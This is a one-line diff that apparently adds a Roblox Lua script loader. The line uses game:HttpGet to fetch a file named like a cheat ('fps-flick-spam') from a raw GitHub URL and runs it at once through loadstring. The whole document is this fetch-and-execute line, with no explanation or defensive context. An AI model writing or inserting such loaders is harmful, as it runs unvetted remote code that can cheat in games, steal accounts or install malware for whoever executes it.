@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/fps-flick-spam2-7eib3fg8gbzmmp.lua"))()
